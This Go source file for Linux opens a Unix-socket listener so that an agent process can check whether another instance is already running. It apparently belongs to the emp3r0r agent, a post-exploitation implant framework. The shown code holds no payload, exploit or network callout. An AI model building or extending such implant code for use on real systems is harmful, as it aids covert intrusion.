//go:build linux
// +build linux

package main

import (
	"log"
	"net"
	"os"
	"path/filepath"

	"github.com/jm33-m0/emp3r0r/core/lib/agent"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// listen on a unix socket, used to check if agent is responsive
func socketListen() {
	log.Printf("Starting socket listener on %s", agent.RuntimeConfig.SocketName)
	// if socket file exists
	if util.IsExist(agent.RuntimeConfig.SocketName) {
		log.Printf("%s exists, testing connection...", agent.RuntimeConfig.SocketName)
		if isAgentAliveSocket() {
			log.Fatalf("%s exists, and agent is alive, aborting", agent.RuntimeConfig.SocketName)
		}
		err := os.Remove(agent.RuntimeConfig.SocketName)
		if err != nil {
			log.Fatalf("Failed to delete socket: %v", err)
		}
	}
	cwd, err := os.Getwd()
	if err != nil {
		log.Fatalf("Failed to get current working directory: %v", err)
	}
	os.Chdir(filepath.Dir(agent.RuntimeConfig.SocketName))
	defer os.Chdir(cwd)
	log.Printf("Cd to %s", agent.RuntimeConfig.AgentRoot)

	// use basename to make sure the socket path is not too long (107), otherwise it will fail
	socket_name := util.FileBaseName(agent.RuntimeConfig.SocketName)
	l, err := net.Listen("unix", socket_name)
	if err != nil {
		log.Fatalf("failed to bind unix socket %s: %v", socket_name, err)
	}
	for {
		fd, err := l.Accept()
		if err != nil {
			log.Fatal("accept error:", err)
		}
		go socket_server(fd)
	}
}
